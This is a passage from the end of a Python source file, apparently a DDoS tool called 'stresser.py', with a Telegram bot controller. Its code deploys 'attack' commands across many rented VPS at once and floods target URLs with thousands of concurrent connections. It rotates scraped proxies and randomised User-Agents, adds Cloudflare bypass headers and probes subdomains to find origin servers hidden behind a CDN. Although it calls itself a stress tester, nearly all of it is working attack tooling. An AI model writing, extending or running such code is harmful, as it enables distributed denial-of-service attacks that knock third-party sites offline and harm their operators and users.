        await self.send(chat_id, "\n".join(lines))

    async def _cmd_deploy(self, chat_id: int, args: List[str]) -> None:
        if not args:
            await self.send(chat_id, "Usage: /deploy <attack_args>\n"
                                     "Example: /deploy https://target.com -d 60 -c 200 --rand-ua")
            return
        servers = self.vps.list()
        if not servers:
            await self.send(chat_id, "📭 No VPS registered.")
            return

        attack_cmd = " ".join(args)
        await self.send(chat_id, f"🚀 Deploying attack to {len(servers)} VPS...\nCmd: {attack_cmd}")

        async def deploy_one(srv):
            log = await self.vps.deploy_and_run(srv, attack_cmd)
            return srv['ip'], log

        tasks = [deploy_one(s) for s in servers]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        lines = ["📡 <b>Deploy Results</b>"]
        for r in results:
            if isinstance(r, tuple):
                ip, log = r
                lines.append(f"<code>{ip}</code>: {log[:100]}")
            elif isinstance(r, Exception):
                lines.append(f"Error: {str(r)[:80]}")

        await self.send(chat_id, "\n".join(lines))
        await self.send(chat_id, "✅ Deployment complete. Use /vpsstatus to check.")

    async def _cmd_scrape(self, chat_id: int, args: List[str]) -> None:
        await self.send(chat_id, "🔍 Scraping proxies from public APIs...")
        count = await self.proxy_mgr.scrape()
        await self.send(chat_id, f"✅ Scraped {count} proxies total.\n"
                                 f"Use /checkproxy to validate them.")

    async def _cmd_proxies(self, chat_id: int, args: List[str]) -> None:
        stats = self.proxy_mgr.stats()
        await self.send(chat_id, f"📊 <b>Proxy Stats</b>\n{stats}")

    async def _cmd_checkproxy(self, chat_id: int, args: List[str]) -> None:
        proxies = self.proxy_mgr.all_proxies
        if not proxies:
            await self.send(chat_id, "No proxies to check. Use /scrape first.")
            return
        await self.send(chat_id, f"🔍 Testing {len(proxies)} proxies (this may take a while)...")
        working, failed, saved = await self.proxy_mgr.check_all()
        msg = (
            f"✅ <b>Proxy Check Complete</b>\n"
            f"Tested: {working + failed}\n"
            f"Working: {working}\n"
            f"Failed: {failed}\n"
            f"Saved to: {PROXY_FILE}"
        )
        await self.send(chat_id, msg)

    # ---------- Main bot loop ----------

    async def run(self):
        """Main bot polling loop."""
        print("[Bot] Sending startup broadcast...")
        await self.broadcast("🤖 <b>Stresser Bot Started</b>\nCommands: /help")
        print("[Bot] Bot is online and polling for commands...")
        while True:
            try:
                async for update in self.get_updates():
                    await self.handle_command(update)
            except asyncio.CancelledError:
                break
            except Exception as e:
                print(f"[Bot] Poll error: {e}")
                await asyncio.sleep(5)


# ===================================================================
# SECTION 5: MAIN ENTRY POINT
# ===================================================================

def main():
    p = argparse.ArgumentParser(
        description="Stresser - Telegram-controlled HTTP stress-testing tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
  python3 stresser.py http://target.com -d 30 -c 2000
  python3 stresser.py https://target.com -d 60 -c 500 --cf-bypass
  python3 stresser.py --telegram
  python3 stresser.py http://target.com --proxy-list proxies.txt --rand-ua
        """,
    )
    p.add_argument("url", nargs="?", help="Target URL")
    p.add_argument("--mode", choices=["server", "client"], default="client")
    p.add_argument("--telegram", action="store_true", help="Start Telegram bot controller")
    p.add_argument("-d", "--duration", type=int, default=30, help="Test duration in seconds")
    p.add_argument("-c", "--connections", type=int, default=200,
                   help="Concurrent connections (default: 200)")
    p.add_argument("-t", "--timeout", type=float, default=10, help="I/O timeout in seconds")
    p.add_argument("--cf-bypass", action="store_true",
                   help="Add Cloudflare bypass headers (X-Forwarded-For, etc.)")
    p.add_argument("--rand-ua", action="store_true",
                   help="Randomize User-Agent per request")
    p.add_argument("--discover-origin", action="store_true",
                   help="Attempt to discover origin server behind Cloudflare")
    p.add_argument("--proxy-list", type=str, metavar="FILE",
                   help="File with proxies (one ip:port per line)")
    p.add_argument("--scrape-proxies", action="store_true",
                   help="Scrape free proxies from public APIs before starting")
    p.add_argument("--scrape-timeout", type=int, default=15,
                   help="Timeout in seconds for proxy scraping")
    p.add_argument("--http2", action="store_true",
                   help="Use HTTP/2 (httpx) instead of raw TCP. Better against Cloudflare.")
    p.add_argument("-p", "--processes", type=int, default=1,
                   help="Number of parallel processes (default: 1). More processes = higher RPS.")
    args = p.parse_args()

    # ----- Telegram Bot Mode -----
    if args.telegram:
        print("[*] Starting Telegram bot controller...")
        bot = TelegramBot(BOT_TOKEN, ALLOWED_CHAT_IDS)
        try:
            asyncio.run(bot.run())
        except KeyboardInterrupt:
            print("\n[!] Bot stopped.")
        return

    if args.mode == "server":
        run_server()
        return

    if not args.url:
        p.print_help()
        sys.exit(1)

    # ----- Standard CLI Mode (existing) -----
    proxy_list: List[str] = []
    if args.proxy_list:
        proxy_list.extend(load_proxy_file(args.proxy_list))
    if args.scrape_proxies:
        print("[*] Scraping proxies from public APIs...")
        try:
            scraped = asyncio.run(scrape_proxies(args.scrape_timeout))
            proxy_list.extend(scraped)
        except Exception as e:
            print(f"  [-] Proxy scrape failed: {e}")
        seen: set = set()
        deduped = []
        for pe in proxy_list:
            if pe not in seen:
                seen.add(pe)
                deduped.append(pe)
        proxy_list = deduped
        print(f"  [+] Total unique proxies: {len(proxy_list)}")

    if args.discover_origin:
        host = urlparse(args.url).hostname
        print(f"[*] Origin discovery for {host}...")
        for sub in ["direct", "origin", "cdn", "mail", "api", "dev", "staging", "test"]:
            try:
                ip = socket.gethostbyname(f"{sub}.{host}")
                print(f"  {sub}.{host} -> {ip}")
            except Exception:
                pass
        return

    if args.processes > 1:
        run_mp(args.url, args.duration, args.connections, args.timeout,
               args.cf_bypass, args.rand_ua, proxy_list, args.processes,
               http2=args.http2)
    else:
        result = asyncio.run(stress(args.url, args.duration, args.connections,
                                    args.timeout, args.cf_bypass, args.rand_ua, proxy_list,
                                    http2=args.http2))
        # Print results to stdout
        elapsed = result['elapsed']
        total = result['total']
        rps = result['rps']
        ok = result['ok']
        fail = result['fail']
        sc = result.get('sc', {})
        errs = result.get('errors', {})
        bytes_recv = result.get('bytes', 0)

        print(f"\n{'='*60}")
        print("  STRESS TEST RESULTS")
        print(f"{'='*60}")
        print(f"  Duration:      {elapsed:.2f}s")
        print(f"  Total:         {total:,}")
        print(f"  Completed:     {ok:,}")
        print(f"  Failed:        {fail:,}")
        print(f"  Requests/sec:  {rps:,.2f}")
        if bytes_recv:
            print(f"  Throughput:    {bytes_recv/1024/1024:.2f} MB/s")
        if ok > 0:
            avg_lat = result.get('lat_total', 0) / ok
            print(f"  Avg latency:   {avg_lat*1000:.2f}ms")
            if result.get('lat_min', float('inf')) != float('inf'):
                print(f"  Min latency:   {result['lat_min']*1000:.2f}ms")
            if result.get('lat_max', 0) > 0:
                print(f"  Max latency:   {result['lat_max']*1000:.2f}ms")
            print(f"  Status codes:  {dict(sorted(sc.items()))}")
        if errs:
            print(f"  Errors:        {dict(sorted(errs.items()))}")
        print(f"{'='*60}\n")


def run_mp(url: str, duration: int, connections: int, timeout: float,
            cf_bypass: bool, rand_ua: bool, proxy_list: List[str],
            num_processes: int, http2: bool = False) -> None:
    """Run stress test across multiple processes for higher throughput."""
    conns_per_process = max(1, connections // num_processes)
    procs = []
    total_conns = conns_per_process * num_processes
    remaining = connections - total_conns

    print(f"[+] Spawning {num_processes} processes ({total_conns + remaining} total connections)...")
    print()

    results: List[mp.Queue] = [mp.Queue() for _ in range(num_processes)]

    for i in range(num_processes):
        c = conns_per_process + (1 if i < remaining else 0)
        p = mp.Process(
            target=_mp_worker,
            args=(i, url, duration, c, timeout, cf_bypass, rand_ua, proxy_list, results[i], http2),
            daemon=True,
        )
        p.start()
        procs.append(p)

    start = time.time()
    try:
        for p in procs:
            p.join()
    except KeyboardInterrupt:
        print("\n[!] Interrupting workers...")
        for p in procs:
            p.kill()
        sys.exit(1)

    elapsed = time.time() - start

    total_ok = total_fail = total_recv = 0
    total_lat = 0.0
    lat_min = float('inf')
    lat_max = 0.0
    all_sc: Dict[int, int] = {}
    all_errors: Dict[str, int] = {}

    for q in results:
        try:
            r = q.get_nowait()
        except Exception:
            continue
        total_ok += r.get('ok', 0)
        total_fail += r.get('fail', 0)
        total_recv += r.get('bytes', 0)
        total_lat += r.get('lat_total', 0.0)
        if r.get('lat_min', float('inf')) < lat_min:
            lat_min = r['lat_min']
        if r.get('lat_max', 0.0) > lat_max:
            lat_max = r['lat_max']
        for code, cnt in r.get('sc', {}).items():
            all_sc[code] = all_sc.get(code, 0) + cnt
        for e, cnt in r.get('errors', {}).items():
            all_errors[e] = all_errors.get(e, 0) + cnt

    total = total_ok + total_fail
    rps = total / elapsed if elapsed > 0 else 0

    print(f"\n{'='*60}")
    print("  MULTI-PROCESS AGGREGATED RESULTS")
    print(f"{'='*60}")
    print(f"  Duration:      {elapsed:.2f}s")
    print(f"  Processes:     {num_processes}")
    print(f"  Total:         {total:,}")
    print(f"  Completed:     {total_ok:,}")
    print(f"  Failed:        {total_fail:,}")
    print(f"  Requests/sec:  {rps:,.2f}")
    if total_recv:
        print(f"  Throughput:    {total_recv/1024/1024:.2f} MB/s")
    if total_ok > 0:
        avg_lat = total_lat / total_ok
        print(f"  Avg latency:   {avg_lat*1000:.2f}ms")
        print(f"  Min latency:   {lat_min*1000:.2f}ms")
        print(f"  Max latency:   {lat_max*1000:.2f}ms")
        print(f"  Status codes:  {dict(sorted(all_sc.items()))}")
    if all_errors:
        print(f"  Errors:        {dict(sorted(all_errors.items()))}")
    print(f"{'='*60}\n")


def _mp_worker(pid: int, url: str, duration: int, connections: int,
               timeout: float, cf_bypass: bool, rand_ua: bool,
               proxy_list: List[str], result_queue: mp.Queue,
               http2: bool = False) -> None:
    import asyncio
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        result = loop.run_until_complete(
            stress(url, duration, connections, timeout,
                   cf_bypass, rand_ua, proxy_list, http2=http2)
        )
    except Exception as e:
        result = {'ok': 0, 'fail': 0, 'bytes': 0, 'lat_total': 0,
                  'lat_min': 0, 'lat_max': 0, 'sc': {}, 'errors': {str(e): 1},
                  'total': 0, 'rps': 0, 'elapsed': 0}
    finally:
        loop.close()
    result_queue.put(result)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
        sys.exit(0)














